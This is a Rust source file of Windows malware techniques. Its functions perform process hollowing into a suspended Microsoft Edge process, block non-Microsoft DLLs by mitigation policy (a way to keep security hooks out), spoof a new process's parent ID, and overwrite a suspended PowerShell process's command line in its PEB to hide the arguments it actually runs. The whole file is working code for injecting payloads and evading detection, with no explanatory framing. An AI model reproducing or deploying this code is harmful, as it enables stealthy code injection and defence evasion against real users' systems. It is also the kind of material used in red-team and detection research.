use std::{fs, mem::size_of, os::raw::c_void};
use windows::{
    core::{s, PCSTR, PSTR, PWSTR},
    Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS},
    Win32::{
        Foundation::{self, CloseHandle, HANDLE, HMODULE},
        System::{
            Diagnostics::Debug::{
                GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
                CONTEXT_FULL_AMD64, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
            },
            LibraryLoader::GetModuleFileNameA,
            Memory::{VirtualAllocEx, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
            SystemServices::{IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER},
            Threading::{
                CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
                OpenProcess, ResumeThread, UpdateProcThreadAttribute, CREATE_SUSPENDED,
                EXTENDED_STARTUPINFO_PRESENT, LPPROC_THREAD_ATTRIBUTE_LIST, PEB,
                PROCESS_BASIC_INFORMATION, PROCESS_CREATE_PROCESS, PROCESS_CREATION_FLAGS,
                PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, RTL_USER_PROCESS_PARAMETERS, STARTUPINFOA,
                STARTUPINFOEXA,
            },
        },
    },
};

pub fn get_current_filename() -> String {
    let mut buffer: [u8; 260] = [0; 260]; // MAX_PATH is typically 260
    let length = unsafe { GetModuleFileNameA(HMODULE::default(), &mut buffer) };

    String::from_utf8(buffer[..length as usize].to_vec())
        .expect("Failed to convert buffer to String")
}

// https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only
#[derive(Debug, Copy, Clone)]
struct ImageRelocationEntry {
    data: u16,
}

impl ImageRelocationEntry {
    // Getter for the offset field
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    // Getter for the type field
    fn type_(&self) -> u8 {
        (self.data >> 12) as u8
    }
}

fn get_file_offset(
    rva: usize,
    nt_headers: IMAGE_NT_HEADERS64,
    section_header: *const IMAGE_SECTION_HEADER,
) -> usize {
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
        let end_of_header = curr_section_header.VirtualAddress + curr_section_header.SizeOfRawData;
        if end_of_header as usize >= rva {
            return rva - curr_section_header.VirtualAddress as usize
                + curr_section_header.PointerToRawData as usize;
        }
    }

    panic!("Could not find correct section!");
}

fn get_reloc_section(
    relocation_table_address: u32,
    nt_headers: IMAGE_NT_HEADERS64,
    section_header: *const IMAGE_SECTION_HEADER,
) -> IMAGE_SECTION_HEADER {
    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let curr_section_header = unsafe { *(section_header.add(i as usize)) };
        if relocation_table_address == curr_section_header.VirtualAddress {
            return curr_section_header;
        }
    }

    panic!("Could not find reloc section!");
}

fn get_address(contents: &Vec<u8>, offset: usize) -> i64 {
    let slice = &contents[offset..offset + 8];
    let array: [u8; 8] = slice.try_into().expect("slice with incorrect length"); 
    return i64::from_le_bytes(array);
}

fn write_address(contents: &mut Vec<u8>, offset: usize, address: i64) {
    let bytes = address.to_le_bytes();
    contents[offset..offset + 8].copy_from_slice(&bytes);
}

// This currently works only for x64. For x86 registers and offsets need to be adjusted.
pub fn process_hollowing(filename: String) {
    let mut contents = fs::read(filename.clone()).expect("Could not read file");

    let dos_header = contents.as_ptr() as *const IMAGE_DOS_HEADER;
    let nt_headers = unsafe {
        (contents.as_ptr().add((*dos_header).e_lfanew as usize)) as *mut IMAGE_NT_HEADERS64
    };
    let section_header =
        ((nt_headers as usize) + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    let mut startup_info = STARTUPINFOA::default();
    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
    let mut process_info = PROCESS_INFORMATION::default();

    let _ = unsafe {
        CreateProcessA(
            s!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0"),
            PSTR::null(),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
            None,
            None,
            &startup_info,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // this pattern is used instead of VirtualAlloc
    let mut ctx_box: Box<[u8]> = vec![0; size_of::<CONTEXT>()].into_boxed_slice();
    let ctx = ctx_box.as_mut_ptr() as *mut _ as *mut CONTEXT;
    unsafe {
        (*ctx).ContextFlags = CONTEXT_FULL_AMD64;
    }

    unsafe {
        GetThreadContext(process_info.hThread, ctx).expect("Could not get thread context");
    }

    let image_base = unsafe {
        VirtualAllocEx(
            process_info.hProcess,
            //Some((*nt_headers).OptionalHeader.ImageBase as *const c_void),
            None,
            (*nt_headers).OptionalHeader.SizeOfImage as usize,
            VIRTUAL_ALLOCATION_TYPE(0x3000),
            PAGE_EXECUTE_READWRITE,
        )
    };

    let delta_image =
        unsafe { image_base.sub((*nt_headers).OptionalHeader.ImageBase as usize) } as i64;
    let reloc_header = (unsafe { *nt_headers }).OptionalHeader.DataDirectory[5];
    // Check if a relocation header is present and if the image base is not the preferred image base
    if delta_image != 0 && reloc_header.VirtualAddress != 0 {
        // If so, do the relocation
        unsafe {
            (*nt_headers).OptionalHeader.ImageBase = image_base as u64;
            let image_relocation_section =
                get_reloc_section(reloc_header.VirtualAddress, *nt_headers, section_header);
            let mut reloc_offset: usize = 0;
            while reloc_offset < reloc_header.Size as usize {
                let image_base_relocation = contents
                    .as_ptr()
                    .add(image_relocation_section.PointerToRawData as usize)
                    .add(reloc_offset)
                    as *const IMAGE_BASE_RELOCATION;
                reloc_offset += size_of::<IMAGE_BASE_RELOCATION>();
                let number_of_entries = ((*image_base_relocation).SizeOfBlock as usize
                    - size_of::<IMAGE_BASE_RELOCATION>())
                    / size_of::<ImageRelocationEntry>();
                for _ in 0..number_of_entries {
                    let image_relocation_entry = contents
                        .as_ptr()
                        .add(image_relocation_section.PointerToRawData as usize)
                        .add(reloc_offset)
                        as *const ImageRelocationEntry;
                    reloc_offset += size_of::<ImageRelocationEntry>();
                    if (*image_relocation_entry).type_() == 0 {
                        continue;
                    }
                    let relocation_address_va = (*image_base_relocation).VirtualAddress as usize
                        + (*image_relocation_entry).offset() as usize;
                    let relocation_address_offset = get_file_offset(relocation_address_va, *nt_headers, section_header);
                    let mut patched_address = get_address(&contents, relocation_address_offset);
                    patched_address += delta_image;
                    write_address(&mut contents, relocation_address_offset, patched_address);
                }
            }
        }
    }

    // Writing (patched) headers
    unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            image_base as *const c_void,
            contents.as_ptr() as *const c_void,
            (*nt_headers).OptionalHeader.SizeOfHeaders as usize,
            None,
        )
        .expect("Could not write to process memory");

        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
            let curr_section_header = *(section_header.add(i as usize));
            WriteProcessMemory(
                process_info.hProcess,
                image_base.add(curr_section_header.VirtualAddress as usize),
                contents
                    .as_ptr()
                    .add(curr_section_header.PointerToRawData as usize)
                    as *const c_void,
                curr_section_header.SizeOfRawData as usize,
                None,
            )
            .expect("Could not write to process memory");
        }

        // Change image base
        if delta_image != 0 {
            WriteProcessMemory(
                process_info.hProcess,
                ((*ctx).Rdx + 0x10 as u64) as *const c_void,
                &image_base as *const _ as *const c_void,
                size_of::<*const c_void>() as usize,
                None,
            )
            .expect("Could not write to image base");
        }

        // Change entrypoint of thread
        (*ctx).Rcx =
            image_base.add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize) as u64;
        SetThreadContext(process_info.hThread, ctx).expect("Could not set thread context");
        ResumeThread(process_info.hThread);
    }
}

pub fn apply_process_mitigation_policy() {
    let mut startup_info = STARTUPINFOEXA::default();
    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
    // We only use 1 argument (the mitigation policy)
    let mut lp_size = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            1,
            0,
            &mut lp_size,
        );
    };

    // Create the memory needed for the attribute list
    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
    // Calling InitializeProcThreadAttributeList again to initialize the list
    unsafe {
        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
    };

    // Update the list so that it contains the PPID
    let policy: u64 = 0x100000000000; //  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            Some(&policy as *const _ as *const c_void),
            size_of::<u64>(),
            None,
            None,
        )
        .expect("Could not update ProcThreadAttribute");
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
    };
}

pub fn spoof_ppid(ppid: u32) {
    let mut startup_info = STARTUPINFOEXA::default();
    startup_info.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as u32;

    // Get size for the LPPROC_THREAD_ATTRIBUTE_LIST
    // We only use 1 argument (the parent id process)
    let mut lp_size = 0;
    unsafe {
        let _ = InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST::default(),
            1,
            0,
            &mut lp_size,
        );
    };

    // Create the memory needed for the attribute list
    let mut attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
    startup_info.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attribute_list.as_mut_ptr() as _);
    // Calling InitializeProcThreadAttributeList again to initialize the list
    unsafe {
        let _ = InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut lp_size);
    };

    //Open handle to PPID
    let handle_parent = unsafe {
        OpenProcess(PROCESS_CREATE_PROCESS, false, ppid)
            .expect("Could not open handle to parent process.")
    };

    // Update the list so that it contains the PPID
    unsafe {
        let _ = UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&handle_parent as *const _ as *const c_void),
            size_of::<HANDLE>(),
            None,
            None,
        );
    }

    // The updated list can then be used within CreateProcess with the EXTENDED_STARTUPINFO_PRESENT flag
    let mut process_info = PROCESS_INFORMATION::default();
    let _ = unsafe {
        CreateProcessA(
            PCSTR("C:\\Windows\\System32\\notepad.exe\0".as_ptr()),
            PSTR(String::from("\"C:\\Windows\\System32\\notepad.exe\"\0").as_mut_ptr()),
            None,
            None,
            false,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            None,
            None,
            &startup_info.StartupInfo,
            &mut process_info,
        )
        .expect("Could not create process")
    };

    // Clean up
    unsafe {
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
        let _ = CloseHandle(handle_parent);
    };
}

pub fn spoof_arguments() {
    let mut startup_info = STARTUPINFOA::default();
    startup_info.cb = size_of::<STARTUPINFOA>() as u32;
    let mut process_info = PROCESS_INFORMATION::default();

    unsafe {
        // Keep in mind that the fake arguments need to be longer then the real arguments.
        let _ = CreateProcessA(
            PCSTR("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0".as_ptr()),
            PSTR(String::from("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"(Get-PSDrive $Env:SystemDrive.Trim(':')).Free/1GB\"\0").as_mut_ptr()),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(0x00000004), //CREATE_SUSPENDED
            None,
            None,
            &startup_info,
            &mut process_info
        ).expect("Could not create process");

        let mut process_basic_info = PROCESS_BASIC_INFORMATION::default();

        let mut return_length = 0;
        NtQueryInformationProcess(
            process_info.hProcess,
            PROCESSINFOCLASS(0),
            &mut process_basic_info as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        // Read PEB from new process
        let mut process_environment_block = PEB::default();
        ReadProcessMemory(
            process_info.hProcess,
            process_basic_info.PebBaseAddress as *const c_void,
            &mut process_environment_block as *mut _ as *mut c_void,
            size_of::<PEB>(),
            None,
        )
        .expect("Could not read PEB");

        // Read arguments from new process
        let mut parameters = RTL_USER_PROCESS_PARAMETERS::default();
        ReadProcessMemory(
            process_info.hProcess,
            process_environment_block.ProcessParameters as *const c_void,
            &mut parameters as *mut _ as *mut c_void,
            size_of::<RTL_USER_PROCESS_PARAMETERS>(),
            None,
        )
        .expect("Could not read arguments");

        let mut encoded_args: Vec<u16> = "powershell -c \"Write-Host Hello World\"\0"
            .encode_utf16()
            .collect();

        // Patching the length. This step is optional.
        // If this step is skipped the arguments string will be printed in full length when examined through ProcessHacker
        let length = size_of::<u16>() * encoded_args.len();
        let offset = size_of::<[u8; 16]>()
            + size_of::<[*mut c_void; 10]>()
            + size_of::<Foundation::UNICODE_STRING>();
        WriteProcessMemory(
            process_info.hProcess,
            (process_environment_block.ProcessParameters as *const c_void).add(offset),
            &length as *const usize as *const c_void,
            size_of::<u16>(),
            None,
        )
        .expect("Could not write length");

        // Clear out the old arguments.
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            vec![0; (parameters.CommandLine.Length) as usize].as_ptr() as *const c_void,
            parameters.CommandLine.Length as usize,
            None,
        )
        .expect("Could not clean arguments");

        // Patching the new arguments.
        let real_args = PWSTR(encoded_args.as_mut_ptr());
        WriteProcessMemory(
            process_info.hProcess,
            parameters.CommandLine.Buffer.as_ptr() as *const c_void,
            real_args.as_ptr() as *const c_void,
            size_of::<u16>() * encoded_args.len(),
            None,
        )
        .expect("Could not write arguments");

        ResumeThread(process_info.hThread);

        // Cleanup
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);
    };
}
